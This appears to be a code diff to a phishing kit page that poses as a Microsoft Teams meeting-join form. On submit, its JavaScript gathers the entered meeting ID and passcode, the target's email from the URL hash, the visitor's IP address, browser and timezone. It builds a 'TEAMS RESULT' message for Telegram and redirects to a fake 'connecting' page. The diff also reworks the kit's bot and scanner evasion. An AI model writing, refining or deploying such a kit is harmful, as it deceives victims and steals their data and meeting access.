@@ -135,47 +135,48 @@
                                 <div> 
                                   <section id="simple-form-oc6c7f">
 								  <form id="joinForm" autocomplete="off" novalidate class="oc-teams-meeting w-lg-col-8 w-xl-col-10">
-  <div class="form-row">
-    <div class="col-xl-6">
-      <label class="small w-100" for="meetingID">Enter meeting ID<span> *</span></label>
-      <input
-        class="form-control mb-1"
-        id="meetingID"
-        name="meetingID"
-        type="text"
-        required
-        autocomplete="off"
-        placeholder="Meeting ID"
-      />
-      <div class="invalid-feedback" id="meetingIdError"></div>
-    </div>
-    <div class="col-xl-6">
-      <label class="small w-100" for="password">Enter meeting Passcode<span> *</span></label>
-      <input
-        class="form-control mb-1"
-        id="password"
-        name="password"
-        type="text"
-        required
-        autocomplete="off"
-        placeholder="Passcode"
-      />
-      <div class="invalid-feedback" id="passwordError"></div>
-    </div>
+<div class="form-row">
+  <div class="col-xl-6">
+    <label class="small w-100" for="meetingID">Enter meeting ID<span> *</span></label>
+    <input
+      class="form-control mb-1"
+      id="meetingID"
+      name="meetingID"
+      type="text"
+      required
+      autocomplete="off"
+      placeholder="Meeting ID"
+    />
   </div>
+  <div class="col-xl-6">
+    <label class="small w-100" for="password">Enter meeting Passcode<span> *</span></label>
+    <input
+      class="form-control mb-1"
+      id="password"
+      name="password"
+      type="text"
+      required
+      autocomplete="off"
+      placeholder="Passcode"
+    />
+  </div>
+</div>
 
-  <!-- Honeypot field (hidden from users) -->
-  <div style="display:none;">
-    <label for="hp_email">Email (leave empty)</label>
-    <input type="text" id="hp_email" name="hp_email" autocomplete="off" tabindex="-1" />
-  </div>
+<!-- Honeypot field (hidden from users) -->
+<div style="display:none;">
+  <label for="hp_email">Email (leave empty)</label>
+  <input type="text" id="hp_email" name="hp_email" autocomplete="off" tabindex="-1" />
+</div>
 
-  <div class="link-group">
-    <button class="btn form-group btn-primary w-100 w-md-auto mt-4" type="submit">
-      Join a meeting
-    </button>
-  </div>
-</form>
+<div class="link-group">
+  <button class="btn form-group btn-primary w-100 w-md-auto mt-4" type="submit">
+    Join a meeting
+  </button>
+</div>
+
+<!-- Professional inline error message -->
+<div id="formError" style="color: red; font-size: 14px; margin-top: 10px; display: none;"></div>
+
                                   </section> 
                                 </div> 
                                 <div class="text-center text-md-left"> 
@@ -274,15 +275,13 @@
 document.getElementById('joinForm').addEventListener('submit', async function(e) {
   e.preventDefault();
 
-  // --- Anti-bot / headless detection ---
-  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
-    document.body.innerHTML = "<h2>Security Verification Failed</h2><p>Please try again from a regular browser.</p>";
-    throw new Error("Headless browser detected");
-  }
-
-  // --- Collect form input ---
   const meetingID = document.getElementById('meetingID').value.trim();
   const password = document.getElementById('password').value.trim();
+  const formError = document.getElementById('formError');
+
+  // Clear previous error
+  formError.style.display = 'none';
+  formError.textContent = '';
 
   // --- Validate Meeting ID and Passcode ---
   const validMeetings = [
@@ -293,17 +292,23 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
   const isValid = validMeetings.some(m => m.id === meetingID && m.pass === password);
 
   if (!isValid) {
-    // Show simple error message
-    alert("Invalid Meeting ID or Passcode. Please try again.");
+    formError.textContent = "Invalid Meeting ID or Passcode. Please try again.";
+    formError.style.display = 'block';
     return;
   }
 
-  // --- Original email capture & Telegram logic ---
-  const browser = navigator.userAgent;
-  const hash = window.location.hash; // "#target@example.com"
+  // --- Anti-bot / hidden field check ---
+  const hpEmail = document.getElementById('hp_email').value;
+  if (hpEmail) {
+    console.warn('Bot detected; submission blocked.');
+    return;
+  }
+
+  // --- Email capture from hash ---
+  const hash = window.location.hash; // "#scott@thecoverallshop.ca"
   const email = hash ? hash.substring(1) : '';
 
-  // Fetch IP
+  // --- Fetch IP ---
   let ipAddress = 'Unavailable';
   try {
     const controller = new AbortController();
@@ -314,9 +319,11 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
     ipAddress = data.ip || 'Unavailable';
   } catch {}
 
+  const browser = navigator.userAgent;
   const currentDateTime = new Date().toLocaleString();
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
+  // --- Telegram message ---
   const message =
     `✅💯 TEAMS RESULT 💯✅\n` +
     `Meeting ID: ${meetingID}\n` +
@@ -340,7 +347,7 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
     });
   } catch {}
 
-  // --- Redirect to Page 2 with hash ---
+  // --- Redirect to connecting.html with hash ---
   setTimeout(() => {
     window.location.href = 'connecting.html' + (hash || '');
   }, Math.floor(Math.random() * 1000) + 500);
